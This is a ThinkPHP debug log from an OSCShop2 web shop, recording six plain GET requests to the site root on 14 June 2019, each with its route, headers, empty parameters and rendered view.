[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-06-14T19:41:33+08:00 ] 171.100.28.210 GET 114.67.89.3:80/
[运行时间：0.348997s] [吞吐率：2.87req/s] [内存消耗：3,636.91kb] [文件加载：51]
[ info ] [ LANG ] /var/www/html/css/oscshop2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.67.89.3:80',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] osc\index\controller\Index->index[ /var/www/html/css/oscshop2/oscshop/index/controller/Index.php ]
[ info ] [ VIEW ] ./themes/shop/index/index/index.html [ array (
  0 => 'top_nav',
  1 => 'cartlist',
  2 => 'total_price',
  3 => 'brands',
  4 => 'no_bottom',
  5 => 'empty',
  6 => 'list',
  7 => 'SEO',
) ]
[ info ] [ SESSION ] INIT array (
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-06-14T21:07:10+08:00 ] 201.150.151.130 GET 114.67.89.3:80/
[运行时间：0.359750s] [吞吐率：2.78req/s] [内存消耗：3,636.91kb] [文件加载：51]
[ info ] [ LANG ] /var/www/html/css/oscshop2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.67.89.3:80',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] osc\index\controller\Index->index[ /var/www/html/css/oscshop2/oscshop/index/controller/Index.php ]
[ info ] [ VIEW ] ./themes/shop/index/index/index.html [ array (
  0 => 'top_nav',
  1 => 'cartlist',
  2 => 'total_price',
  3 => 'brands',
  4 => 'no_bottom',
  5 => 'empty',
  6 => 'list',
  7 => 'SEO',
) ]
[ info ] [ SESSION ] INIT array (
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-06-14T21:12:34+08:00 ] 46.39.16.71 GET 114.67.89.3:80/
[运行时间：0.224270s] [吞吐率：4.46req/s] [内存消耗：3,636.91kb] [文件加载：51]
[ info ] [ LANG ] /var/www/html/css/oscshop2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.67.89.3:80',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] osc\index\controller\Index->index[ /var/www/html/css/oscshop2/oscshop/index/controller/Index.php ]
[ info ] [ VIEW ] ./themes/shop/index/index/index.html [ array (
  0 => 'top_nav',
  1 => 'cartlist',
  2 => 'total_price',
  3 => 'brands',
  4 => 'no_bottom',
  5 => 'empty',
  6 => 'list',
  7 => 'SEO',
) ]
[ info ] [ SESSION ] INIT array (
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-06-14T21:17:56+08:00 ] 193.150.73.205 GET 114.67.89.3:80/
[运行时间：0.359457s] [吞吐率：2.78req/s] [内存消耗：3,636.91kb] [文件加载：51]
[ info ] [ LANG ] /var/www/html/css/oscshop2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.67.89.3:80',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] osc\index\controller\Index->index[ /var/www/html/css/oscshop2/oscshop/index/controller/Index.php ]
[ info ] [ VIEW ] ./themes/shop/index/index/index.html [ array (
  0 => 'top_nav',
  1 => 'cartlist',
  2 => 'total_price',
  3 => 'brands',
  4 => 'no_bottom',
  5 => 'empty',
  6 => 'list',
  7 => 'SEO',
) ]
[ info ] [ SESSION ] INIT array (
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-06-14T21:21:54+08:00 ] 5.190.92.2 GET 114.67.89.3:80/
[运行时间：0.241230s] [吞吐率：4.15req/s] [内存消耗：3,636.91kb] [文件加载：51]
[ info ] [ LANG ] /var/www/html/css/oscshop2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.67.89.3:80',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] osc\index\controller\Index->index[ /var/www/html/css/oscshop2/oscshop/index/controller/Index.php ]
[ info ] [ VIEW ] ./themes/shop/index/index/index.html [ array (
  0 => 'top_nav',
  1 => 'cartlist',
  2 => 'total_price',
  3 => 'brands',
  4 => 'no_bottom',
  5 => 'empty',
  6 => 'list',
  7 => 'SEO',
) ]
[ info ] [ SESSION ] INIT array (
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-06-14T23:28:02+08:00 ] 200.48.137.243 GET 114.67.89.3:80/
[运行时间：0.326700s] [吞吐率：3.06req/s] [内存消耗：3,636.91kb] [文件加载：51]
[ info ] [ LANG ] /var/www/html/css/oscshop2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.67.89.3:80',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] osc\index\controller\Index->index[ /var/www/html/css/oscshop2/oscshop/index/controller/Index.php ]
[ info ] [ VIEW ] ./themes/shop/index/index/index.html [ array (
  0 => 'top_nav',
  1 => 'cartlist',
  2 => 'total_price',
  3 => 'brands',
  4 => 'no_bottom',
  5 => 'empty',
  6 => 'list',
  7 => 'SEO',
) ]
[ info ] [ SESSION ] INIT array (
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
